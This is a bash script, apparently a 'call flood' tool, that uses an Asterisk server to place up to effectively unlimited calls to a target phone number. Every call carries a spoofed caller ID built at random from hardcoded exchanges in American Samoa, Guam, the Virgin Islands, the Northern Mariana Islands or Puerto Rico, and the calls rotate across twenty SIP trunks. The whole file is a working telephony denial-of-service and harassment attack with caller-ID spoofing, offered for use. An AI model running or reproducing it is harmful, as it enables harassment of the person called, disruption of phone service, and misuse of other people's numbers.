#!/bin/bash
## FINAL FLOOD VARIANT ## ABUSES North American Numbering Plan (US) # VULNERABLE DIAL PLANS: Samoa, Guam, Virgin Islands, Northern Mariana Islands, Puerto Rico (DOES NOT CONTIAN LIST FLOOD METHOD)
## CONFIG
# MAIN CONFIG
ext="420"
log_file="/var/log/flood_log.log"
# ARGUMENT CONTROL
tnum=$1; calls=$2
# AREA VARIABLE
area="samoa"
# %RANDOM% SEED
RANDOM=$$$(date +%s) # used for random method as a RANDOM %% SEED
## END OF CONFIG
## START OF SCRIPT
## KILL FUNCTION
if [[ $1 == "kill" || $1 == "k" || $1 == "-k" || $1 == "--kill" ]]; then # kills all screened floods
    if [[ -z $2 ]]; then
    pkill -9 -f "flood_atk"; asterisk -rx "channel request hangup all"
    pkill -9 -f "fl"
    screen -wipe &> /dev/null
    echo "All Hanging Calls Terminated!"
    rm /tmp/callfile* &> /dev/null
    exit 0
else # kills individual flood
    pkill -9 -f "$2"
    screen -wipe &> /dev/null
    echo "All Hanging Calls Terminated!"
    rm /tmp/callfile* &> /dev/null
    exit 0
fi; fi
## CHECKING USER INPUT
if ! [[ $tnum =~ ^[0-9]+$ || $calls =~ ^[0-9]+$ ]]; then # user input must only contain numbers
	echo "you fucked up... ($1) (TARGET NUMBER & CALL AMOUNT MUST ONLY CONTAIN NUMBERS!)"
	exit 0
elif [[ $1 -lt "10000000000" ]]; then # target number must be a valid 11 digit phone number
	echo "you fucked up... ($1) (TARGET NUMBER MUST BE 11 DIGITS!)"
	exit 0
fi
# INFINITE CALL VARIABLE
if [[ $calls == "0" ]]; then # if calls = 0 then calls will = maximum integer avaliable (basically infinite call flood!)
	MAX_INT=0
for ((x=1,y=1; x<<=y; y<<=1))
do
    if ((x>0)); then
        MAX_INT=$x
        continue
    fi; if (((x=~x)>0)); then
        MAX_INT=$x
    fi; break
done
    calls="$MAX_INT" # $MAX_INT = current maximum integer
fi
## SETTING AREA VARIABLES (FOR RANDOM METHOD)
if [[ $area == "samoa" ]]; then # American Samoa (188,979 Phone Numbers) (21x8999) (9999-1000=8999)
	ccode="1"
	prefix=("684")
	exchange=("248" "252" "254" "256" "258" "272" "274" "276" "299" "622" "633" "644" "655" "677" "688" "691" "699" "731" "733" "770" "782")
	suffix_range="1000-9999"
elif [[ $area == "guam" ]]; then # Guam (188,979 Phone Numbers)
	ccode="1"
	prefix=("671")
	exchange=("300" "333" "339" "343" "344" "349" "355" "362" "366" "400" "456" "471" "472" "473" "474" "475" "477" "478" "479" "480" "482")
	suffix_range="1000-9999"
elif [[ $area == "vir" ]]; then # US Virgin Islands (188,979 Phone Numbers)
	ccode="1"
	prefix=("340")
	exchange=("200" "201" "202" "203" "204" "205" "206" "207" "208" "209" "210" "220" "226" "227" "228" "244" "249" "277" "332" "344" "422")
	suffix_range="1000-9999"
elif [[ $area == "nomaria" ]]; then # Northern Mariana Islands (188,979 Phone Numbers)
	ccode="1"
	prefix=("670")
	exchange=("233" "234" "235" "236" "237" "256" "284" "285" "286" "287" "288" "321" "322" "323" "328" "433" "483" "484" "488" "532" "588")
	suffix_range="1000-9999"
elif [[ $area == "prico" ]]; then # Puerto Rico (188,979 Phone Numbers)
	ccode="1"
	prefix=("939")
	exchange=("200" "201" "202" "203" "204" "205" "206" "207" "208" "209" "210" "211" "212" "213" "214" "215" "216" "217" "218" "219" "221")
	suffix_range="1000-9999"
else
	echo "you fucked up... ($area) (AREA IS NOT HARDCODED!)" # $area variable doesnt equal a known hardcoded area!
fi
#
echo "Flood Started on $1 ($area), for $2 Seconds!" | tee -a $log_file 
## START CALL COUNTER
for (( c=1; c<=calls; c++))
do
## START OF FLOOD
## START OF METHOD SHIT
randpre=${prefix[$RANDOM % ${#prefix[@]} ]} # random prefix depending on selected area
randexc=${exchange[$RANDOM % ${#exchange[@]} ]} # random exchange depending on selected area
randsuf=$(shuf -i "$suffix_range" -n1)  # random phone number suffix depending on suffix range
cid="1$randpre$randexc$randsuf" # final caller id is compiled here!
## END OF METHOD SHIT
# call file
trunknum=$(shuf -i 1-20 -n1) # selects random trunk from 1-20 (20 hardcoded trunks in asterisk)
trunk="T$trunknum-1" # must be formatted to work with asterisk hardcoded trunks!
echo "Channel: PJSIP/$tnum@$trunk" | tee /tmp/callfile.call > /dev/null
echo "CallerID: $cid" | tee -a /tmp/callfile.call > /dev/null
echo "WaitTime: 1" | tee -a /tmp/callfile.call > /dev/null
echo "Extension: $ext" | tee -a /tmp/callfile.call > /dev/null
chmod 777 /tmp/callfile.call # setting perms for call file
chown asterisk:asterisk /tmp/callfile.call # setting perms for call file
mv /tmp/callfile.call /var/spool/asterisk/outgoing/ # moves call file to outgoing spool (this will start the call process)
rm /tmp/callfile.call &> /dev/null # removes file than ends (most likely repeats unless count is done)
## END OF FLOOD
# END CALL COUNTER
done
## END OF SCRIPT